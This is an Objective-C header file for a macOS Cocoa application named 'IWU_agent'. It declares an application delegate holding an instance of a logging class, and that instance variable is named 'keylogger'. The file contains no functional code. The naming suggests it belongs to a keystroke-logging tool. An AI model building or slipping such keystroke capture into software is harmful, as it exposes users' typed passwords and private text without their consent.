//
//  delegate.h
//  IWU_agent
//
//  Created by Admin on 17.03.16.
//  Copyright © 2016 Admin. All rights reserved.
//

#import <Cocoa/Cocoa.h>
#import "logging.h"

@interface delegate : NSObject <NSApplicationDelegate> {
    logging *keylogger;
}

@end
